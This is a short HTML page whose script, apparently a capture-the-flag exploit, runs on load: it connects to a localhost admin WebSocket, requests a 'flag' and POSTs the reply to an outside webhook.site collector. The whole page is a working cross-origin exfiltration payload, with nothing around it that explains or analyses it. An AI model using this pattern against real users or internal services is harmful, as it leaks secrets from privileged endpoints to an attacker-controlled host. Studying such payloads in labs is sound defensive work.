<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebSocket and Webhook</title>
</head>
<body>
    <h1>WebSocket and Webhook Example</h1>
    <p>The POST request will be sent immediately, and the WebSocket will connect in parallel.</p>

    <script>
        // WebSocket URL
        const websocketURL = "ws://127.0.0.1:8080/admin/ws";

        // Webhook URL
        const webhookURL = "https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a";

        // Create a new WebSocket connection
        const socket = new WebSocket(websocketURL);

        let flag = "";  // Declare a variable to store the received message

        // Open WebSocket connection and send "flag" when connected
        socket.addEventListener("open", (event) => {
            socket.send("flag");
        });

        // Handle message received from WebSocket
        socket.onmessage = (event) => {
            flag = event.data;  // Store the received message in the 'flag' variable
            console.log("Received message:", flag);

            // Send the POST request after the WebSocket message is received
            sendPostToWebhook(flag);

            // Close the WebSocket connection after receiving the message
            socket.close();
        };

        function sendPostToWebhook(flag) {
            console.log("Sending POST request to Webhook");

            // Create the payload with the flag
            const payload = { flag: flag };

            // Send POST request to Webhook with the flag
            fetch(webhookURL, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(payload)  // Send the flag in the payload
            })
            .then(response => {
                if (response.ok) {
                    console.log("POST request sent successfully!");
                } else {
                    console.error("Failed to send POST request:", response.statusText);
                }
            })
            .catch(error => {
                console.error("Error sending POST request:", error);
            });
        }
    </script>
</body>
</html>
